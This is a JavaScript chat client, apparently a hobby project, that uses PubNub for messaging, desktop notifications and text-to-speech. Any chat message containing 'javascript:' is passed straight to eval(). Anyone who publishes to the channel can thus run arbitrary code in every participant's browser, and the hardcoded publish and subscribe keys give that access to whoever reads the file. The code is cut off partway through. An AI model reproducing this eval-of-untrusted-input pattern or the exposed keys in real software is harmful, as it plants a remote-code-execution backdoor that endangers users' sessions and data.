function askForNott(){
  Notification.requestPermission().then(function(result) {
  console.log(result);
});
  Notification.requestPermission();
};
askForNott();
function spawnNotification(theBody,theIcon,theTitle) {
      
  var options = {
      body: theBody,
      icon: theIcon
  }
  var n = new Notification(theTitle,options);
  setTimeout(n.close.bind(n), 5000); 
}
 (function() {
  
  var channel = 'simple-chat';
  // Assign a random avatar in random color
  
  var p = PUBNUB.init({
    subscribe_key: 'sub-c-51411300-ad1e-11e7-895e-c6a8ff6a3d85',
    publish_key: 'pub-c-42177868-59a0-4309-abfd-e36206875430',
    ssl: true
  });
  p.subscribe({
    channel: channel,
    callback: function(m) {
    if(m.avatar.includes('http')){
    
    if(document.visibilityState == "hidden"){
      spawnNotification(m.text, m.avatar, "Oogle Chat Message");
      }
      
    }
   
    else{
     
      if(document.visibilityState == "hidden"){
       spawnNotification(m.text, "https://tebahpla.github.io/stuff/chat/ooglechaticon.png", "Oogle Chat Message");
       }
    }

if(m.text.includes("javascript:")){
var newtext = m.text.replace("javascript:","")
eval(newtext);


}
else if(m.text.includes("say ")){
var newtext = m.text.replace("say ","")
responsiveVoice.speak(newtext);


}
else if(m.text.includes("delete ")){
var newtext = m.text.replace("delete ","")




}

    },
    presence: function(m) {
      if (m.occupancy > 1) {
        
        
      } else {
        
      }
    }
  });
 
